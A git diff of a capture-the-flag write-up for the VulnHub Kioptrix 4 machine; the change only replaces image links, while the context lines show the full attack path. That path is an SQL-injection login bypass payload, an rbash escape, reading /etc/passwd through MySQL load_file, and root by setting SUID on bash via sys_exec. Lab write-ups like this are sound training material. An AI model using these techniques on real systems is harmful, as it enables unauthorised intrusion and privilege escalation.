@@ -8,7 +8,7 @@ categories: ["writeups"]
 series: []
 showToc: true
 cover:
-  image: "https://cdn.ziomsec.com/kioptrix4/cover.png"
+  image: "https://cdn.ziomsec.com/kioptrix4/cover.webp"
   caption: "Kioptrix 4 VulnHub Challenge"
   alt: "Kioptrix 4 cover"
 platform: "VulnHub"
@@ -40,7 +40,7 @@ nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
 | 139      | netbios     |
 | 445      | smb         |
 
-![](https://cdn.ziomsec.com/kioptrix4/1.png)
+![](https://cdn.ziomsec.com/kioptrix4/1.webp)
 
 ## Initial Foothold
 
@@ -48,7 +48,7 @@ nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
 
 I accessed the http service through my web browser and landed on a login panel.
 
-![](https://cdn.ziomsec.com/kioptrix4/2.png)
+![](https://cdn.ziomsec.com/kioptrix4/2.webp)
 
 I then also used **ffuf** to fuzz the web directories for more information.
 
@@ -56,7 +56,7 @@ I then also used **ffuf** to fuzz the web directories for more information.
 ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,301
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/3.png)
+![](https://cdn.ziomsec.com/kioptrix4/3.webp)
 
 Fuzzing files revealed an interesting file called *database.sql* - so I accessed it using **curl**.
 
@@ -64,15 +64,15 @@ Fuzzing files revealed an interesting file called *database.sql* - so I accessed
 curl http://TARGET/database.sql
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/4.png)
+![](https://cdn.ziomsec.com/kioptrix4/4.webp)
 
 The file revealed table name, username and a potential password. However, when I tried these credentials on the login page, it did not work.
 
-![](https://cdn.ziomsec.com/kioptrix4/5.png)
+![](https://cdn.ziomsec.com/kioptrix4/5.webp)
 
 Since our input was making the application interact with the database, I tried **sql injection**. Adding a **`'`** in the password field and got a database error - confirming the vulnerability.
 
-![](https://cdn.ziomsec.com/kioptrix4/6.png)
+![](https://cdn.ziomsec.com/kioptrix4/6.webp)
 
 Hence, I added a true statement and logged in as **john**.
 
@@ -80,7 +80,7 @@ Hence, I added a true statement and logged in as **john**.
 1234'or''=''#
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/7.png)
+![](https://cdn.ziomsec.com/kioptrix4/7.webp)
 
 Upon logging in, I got the user credentials.
 
@@ -90,7 +90,7 @@ The **nmap** scan also revealed an SMB service running, so I use **enum4linux** 
 enum4linux TARGET
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/8.png)
+![](https://cdn.ziomsec.com/kioptrix4/8.webp)
 
 **enum4linux** revealed some more users. I logged in as them and got their password's aswell.
 
@@ -105,7 +105,7 @@ I then used **ssh** to log in as the user *john*.
 ssh john@TARGET
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/9.png)
+![](https://cdn.ziomsec.com/kioptrix4/9.webp)
 
 ### Escaping R-Bash
 
@@ -117,7 +117,7 @@ I used the below command to break out of the **rbash**
 echo os.system('/bin/bash')
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/10.png)
+![](https://cdn.ziomsec.com/kioptrix4/10.webp)
 
 ## Privilege Escalation
 
@@ -126,11 +126,11 @@ echo os.system('/bin/bash')
 I downloaded the **linux smart enumeration** script on the target machine to perform privesc enumeration.
 - https://github.com/diego-treitos/linux-smart-enumeration
 
-![](https://cdn.ziomsec.com/kioptrix4/11.png)
+![](https://cdn.ziomsec.com/kioptrix4/11.webp)
 
 This revealed that I could connect to the MySQL server as root without any password. Therefore, I looked for services running as root and found **MySQL**.
 
-![](https://cdn.ziomsec.com/kioptrix4/12.png)
+![](https://cdn.ziomsec.com/kioptrix4/12.webp)
 
 > I used `grep -v "]"` to exclude internal system services when searching for services running as root, simplifying the results. This confirmed that MySQL was not running with a service user as it normally should but as root. 
 
@@ -141,7 +141,7 @@ mysql -u root -p
 # hit Enter
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/13.png)
+![](https://cdn.ziomsec.com/kioptrix4/13.webp)
 
 I looked into the *members* database and found the credentials of Robert and John.
 
@@ -151,7 +151,7 @@ show tables;
 select * from members;
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/14.png)
+![](https://cdn.ziomsec.com/kioptrix4/14.webp)
 
 Since I was executing commands as root, I could use built-in functions like **`load_file`** to read system files.
 
@@ -159,7 +159,7 @@ Since I was executing commands as root, I could use built-in functions like **`l
 select load_file('/etc/passwd');
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/15.png)
+![](https://cdn.ziomsec.com/kioptrix4/15.webp)
 
 ### Exploiting User-Defined SQL Functions
 
@@ -169,7 +169,7 @@ Inside the *mysql* database, I found a table with functions that could be intere
 select * from func;
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/16.png)
+![](https://cdn.ziomsec.com/kioptrix4/16.webp)
 
 The **sys_exec** function seemed interesting, so I tried using it to create a new file in the *root* directory.
 
@@ -177,11 +177,11 @@ The **sys_exec** function seemed interesting, so I tried using it to create a ne
 select sys_exec('touch /root/test.txt');
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/17.png)
+![](https://cdn.ziomsec.com/kioptrix4/17.webp)
 
 After executing the command, I verified it by visiting the root directory and found our test file.
 
-![](https://cdn.ziomsec.com/kioptrix4/18.png)
+![](https://cdn.ziomsec.com/kioptrix4/18.webp)
 
 Since I could execute commands as *root*, I added an **SUID** bit to the **bash** shell so that I could run it in privileged mode to escalate my privileges.
 
@@ -189,7 +189,7 @@ Since I could execute commands as *root*, I added an **SUID** bit to the **bash*
 select sys_exec('chmod u+s /bin/bash');
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/19.png)
+![](https://cdn.ziomsec.com/kioptrix4/19.webp)
 
 Verifying the bash shell confirmed that an **SUID** bit was added to it.
 
@@ -200,7 +200,7 @@ ls -la /bin/bash
 bash -p
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/20.png)
+![](https://cdn.ziomsec.com/kioptrix4/20.webp)
 
 With root access, I was able to capture the flag located in the */root* directory.
 
@@ -209,7 +209,7 @@ cd /root/
 cat congrats.txt
 ```
 
-![](https://cdn.ziomsec.com/kioptrix4/21.png)
+![](https://cdn.ziomsec.com/kioptrix4/21.webp)
 
 ## Closure
 
